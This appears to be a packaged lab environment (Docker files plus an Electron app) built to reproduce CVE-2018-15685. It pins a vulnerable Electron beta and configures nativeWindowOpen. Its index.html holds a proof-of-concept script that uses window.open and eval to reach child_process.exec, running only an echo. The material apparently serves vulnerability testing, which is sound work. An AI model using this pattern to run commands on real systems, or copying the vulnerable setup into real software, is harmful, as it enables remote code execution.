{
    "files": [
        {
            "location": "./../../dockers/CVE-2018-15685/custom_no_tool/docker-compose.yml",
            "content": "version: '3.7'\n\nservices:\n  electron-app:\n    build: ./electron-app\n    ports:\n      - \"3000:3000\"\n    volumes:\n      - ./electron-app:/usr/src/app\n\nvolumes:\n  electron-app:\n    driver: local\n"
        },
        {
            "location": "./../../dockers/CVE-2018-15685/custom_no_tool/electron-app/Dockerfile",
            "content": "# Use a newer Node.js base image with a supported Debian version\nFROM node:16-bullseye\n\n# Install necessary system dependencies\nRUN apt-get update && apt-get install -y \\\n    libgtk-3-0 \\\n    libx11-xcb1 \\\n    libnss3 \\\n    libxss1 \\\n    libasound2 \\\n    libxkbfile1 \\\n    libsecret-1-dev \\\n    libxtst6 \\\n    xvfb \\\n    --no-install-recommends && \\\n    rm -rf /var/lib/apt/lists/*\n\n# Set environment variable for home directory\nENV HOME=/usr/src/app\n\n# Set working directory\nWORKDIR /usr/src/app\n\n# Copy package.json and package-lock.json\nCOPY package*.json ./\n\n# Install dependencies including development dependencies\nRUN npm install\n\n# Copy the rest of the application code\nCOPY . .\n\n# Expose application port\nEXPOSE 3000\n\n# Start Xvfb and the Electron application\nCMD [\"/bin/bash\", \"-c\", \"Xvfb :99 -screen 0 1024x768x24 & npm start\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-15685/custom_no_tool/electron-app/package.json",
            "content": "{\n  \"name\": \"vulnerable-electron-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"An Electron app vulnerable to CVE-2018-15685\",\n  \"main\": \"main.js\",\n  \"scripts\": {\n    \"start\": \"DISPLAY=:99 electron .\"\n  },\n  \"dependencies\": {\n    \"electron\": \"3.0.0-beta.6\"\n  },\n  \"devDependencies\": {\n    \"electron\": \"3.0.0-beta.6\"\n  }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2018-15685/custom_no_tool/electron-app/main.js",
            "content": "const { app, BrowserWindow } = require('electron');\n\nfunction createWindow() {\n  const win = new BrowserWindow({\n    width: 800,\n    height: 600,\n    webPreferences: {\n      nodeIntegration: false,\n      nativeWindowOpen: true\n    }\n  });\n\n  win.loadFile('index.html');\n}\n\napp.on('ready', createWindow);\n"
        },
        {
            "location": "./../../dockers/CVE-2018-15685/custom_no_tool/electron-app/index.html",
            "content": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Vulnerable Electron App</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Electron App</h1>\n    <script>\n        // This script demonstrates the vulnerability\n        const newWindow = window.open('about:blank', '', 'width=200,height=100');\n        newWindow.eval('require(\"child_process\").exec(\"echo Vulnerable to CVE-2018-15685\")');\n    </script>\n</body>\n</html>\n"
        }
    ],
    "directory_tree": "CVE-2018-15685/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 electron-app/\n        \u251c\u2500\u2500 Dockerfile\n        \u251c\u2500\u2500 package.json\n        \u251c\u2500\u2500 main.js\n        \u2514\u2500\u2500 index.html\n"
}